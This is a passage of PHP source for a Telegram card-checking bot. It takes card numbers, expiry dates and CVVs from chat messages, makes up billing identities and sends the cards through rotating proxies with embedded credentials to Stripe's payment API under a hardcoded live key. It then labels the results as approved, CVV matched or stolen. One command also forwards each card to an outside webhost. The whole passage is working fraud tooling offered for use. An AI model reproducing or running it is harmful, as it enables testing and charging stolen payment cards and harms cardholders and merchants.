//----------------------------------------------------------------------------------------------------------------------//
$first = str_shuffle("ZELTRAX");
$last = str_shuffle("ROCKZ");
$first1 = str_shuffle("zeltrax85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(0000000000,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";}
else{
$zip = "90201";
$city = "Bell";};
//----------------------------------------------------------------------------------------------------------------------//
////////////////////////////////////===[For Authorizing Cards]////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods'); ////This may differ from site to site
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "pxu19057-0:3ngexg3AFr1CLDHPjVzK");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'accept: application/json',
'origin: https://js.stripe.com',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4318.0 Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=Aniruddh+Singhal&billing_details[email]=aniruddhsinghalbot%40gmail.com&billing_details[address][country]=GB&billing_details[address][line1]=Loda&billing_details[address][city]=Berkeley&billing_details[address][postal_code]=94701&guid=dbd2411e-8a4d-4115-9b1e-26bb832520929a8f26&muid=66fef8be-ac45-42da-8f3a-43f400edd990a2711a&sid=e2884216-1ac6-4026-93b6-84a86f98dcd9462d4e&key=pk_live_lw4BVBKClHRQrGjqSvqxw616&payment_user_agent=stripe.js%2F125213ace%3B+stripe-js-v3%2F125213ace%3B+checkout');

$result = curl_exec($ch);
$id = trim(strip_tags(getStr($result,'"id": "','"')));



////////////////////////////===============[For Charging Cards]=============////////////////////////
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/ppage_1IP7WVGiXAJ4ZFSBwNDv5XQ0/confirm'); ////This may differ from site to site
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "pxu19057-0:3ngexg3AFr1CLDHPjVzK");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'accept: application/json',
'origin: https://checkout.stripe.com',
'user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-N910U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'referer: https://checkout.stripe.com/'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$id.'&key=pk_live_lw4BVBKClHRQrGjqSvqxw616');
//========================================================================================================================//
//========================================================================================================================//
$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);



//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED, INCORRECT ZIP CODE ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED, CHARGED (PLEASE REMIND TO UPDATE SITE ) ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b> 『 ★ CVV LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CCN MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b> 『 ★ CVV MATCHED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Expired Card ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Card Declined ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}





/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if ((strpos($message, "!ukg") === 0)||(strpos($message, "/ukg") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if(strlen($year) == 2){
$year = substr($year, -2);}
else{
$year = substr($year, 2);}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


$Supported = substr($cc, 0, 1);
 if($Supported == "4") {
    $cctype = '1';
    }
 elseif ($Supported == "5") {
    $cctype = '3';
    }
  else {
    $cctype = '2';
    }


////////////////////////// BIN LOOKUP/////////////////////////////////////////////




    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else{
$bin = 'Debit';}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////
//----------------------------------------------------------------------------------------------------------------------//
$first = str_shuffle("ZELTRAX");
$last = str_shuffle("ROCKZ");
$first1 = str_shuffle("zeltrax85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(0000000000,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";}
else{
$zip = "90201";
$city = "Bell";};
////////////////////////////===[Luminati Details]

//$username = 'Put Zone Username Here';
//$password = 'Put Zone Password Here';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io'

 //=[Proxy Function] =//

$rp1 = array(
  1 => 'wzrpvcjj-rotate:10k9w7pbtsae',
//2 => 'fsaddxm-rotate:ahdasd7asud',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}




////////////////////////////===[1st Req]

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'http://anichkbot.000webhostapp.com/ukg.php?lista='.$lista.'');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: anichkbot.000webhostapp.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Cookie: _ga=GA1.2.2096889546.1611486140; _omappvp=jfBtCtdNtClAOfCqSRbUrtd7txPjAS8N9iE30Jnux1S5pNnvxaec652WdyIoy5bGVt0iCSnNqdB6OYXhHkmGM0kdCGohZz3S ',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'lista='.$lista.'');

$result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);



//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result, 'incorrect_zip')) || (strpos($result, 'Your card zip code is incorrect.')) || (strpos($result, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, '"cvc_check":"pass"')) || (strpos($result, "Thank You.")) || (strpos($result, '"status": "succeeded"')) || (strpos($result, "Thank You For Donation.")) || (strpos($result, "Your payment has already been processed")) || (strpos($result, "Success ")) || (strpos($result, '"type":"one-time"')) || (strpos($result, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CVV MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, 'Your card has insufficient funds.')) || (strpos($result, 'insufficient_funds'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b> 『 ★ CVV LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate 1</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, "Your card's security code is incorrect.")) || (strpos($result, "incorrect_cvc")) || (strpos($result, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>✅APPROVED</b>%0A<b>RESPONSE:</b> <b>『 ★ CCN MATCHED ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, "Your card does not support this type of purchase.")) || (strpos($result, "transaction_not_allowed"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b> 『 ★ DECLINED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate 1</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, "pickup_card")) || (strpos($result, "lost_card")) || (strpos($result, "stolen_card"))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result, "do_not_honor")){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, 'The card number is incorrect.')) || (strpos($result, 'Your card number is incorrect.')) || (strpos($result, 'incorrect_number'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result, 'Your card has expired.')) || (strpos($result, 'expired_card'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Expired Card ★ 』</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Currency:</b> '.$currency.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Unknown Gate</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result, "generic_decline")){
